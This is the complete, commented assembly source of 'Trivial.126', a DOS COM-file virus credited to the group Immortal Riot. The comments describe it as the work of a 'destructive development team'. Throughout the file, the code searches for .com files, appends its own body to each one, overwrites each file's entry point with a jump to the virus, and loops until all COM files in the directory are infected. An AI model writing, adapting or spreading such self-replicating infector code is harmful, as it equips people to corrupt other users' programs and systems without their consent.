; ------------------------------------------------------------------------------
;
;                          - Trivial.126 -   
;       Created by Immortal Riot's destructive development team
;              (c) 1994 The Unforgiven/Immortal Riot
;
; ------------------------------------------------------------------------------
;                þ Highly detected COM-infector þ
; ------------------------------------------------------------------------------
.model tiny                     
.code
.radix 16
org    100h                       ; cs:100h => start of com file


start:

storbuf db 00,00,00,00            ; just for the first generation!
				  ; this will not be written in the
				  ; files, making the file increase 
				  ; equal to 126 bytes!
v_start:                          
call    get_off                   ; ;)

get_off:
pop     bp                        ; get delta-offset
sub     bp, offset get_off


lea     si,[bp+orgbuf]            ; transer 3 first bytes (2 than 1)
mov     di,100h                   ; from position di:100h to orgbuf!
movsw                             ; 
movsb                             ; 

mov     ah,1ah
lea     dx,[bp+code_end]          ; set dta
int     21h                       ; to end of program

mov     ah,4eh                    ; search for files that
lea     dx,[bp+com_files]         ; match with the extension
find_next:                        ; 'COM'
int     21h

jnc     infect                    ; found one!

quit:
mov     bx,100h                   ; did not, return
jmp     bx                        ; to original program!

infect:
lea     dx,[bp+code_end+1eh]      ; 1eh = adress to filename to open
mov     ax,3d02h                  ; open file
int     21h                       ; in read/write mode

xchg    ax,bx                     ; put filehandle in bx

mov     ah,3fh                    ; read the first three bytes
mov     cx,3                      ; of the file to orgbuf
lea     dx,[bp+orgbuf]  
int     21h                                     

mov     ax,4202h                  ; move file-pointer
xor     cx,cx                     ; to end of file
cwd
int     21h

sub     ax,3h                                ; substract the 3 last bytes
mov     word ptr [bp+first_bytes+1],ax       ; and put em in our buffer

mov     ah,40h                    ; write virus
mov     cx,code_end-v_start       ; # bytes
lea     dx,[bp+v_start]           ; dx:100h         
int     21h                       ;

mov     ax,4200h                  ; move file-pointer to
xor     cx,cx                     ; top of file
cwd
int     21h

mov     ah,40h                    ; write our own jump  
mov     cx,3                      ; instruction to the
lea     dx,[bp+first_bytes]       ; beginning
int     21h                                               

close:
mov     ah,3eh                     ; close file
int     21h

mov     ah,4fh                     ; search next file
jmp     short find_next            ; and loop the procedure
				   ; until all files are infected

com_files:
db      "*.com",0                  ; files to search for

first_bytes:
db       0e9h,00h,00h              ; buffer to calculate a new entry

orgbuf:
db      0cdh,20h,90h               ; buffer to save 3 first bytes

code_end:                          
end start
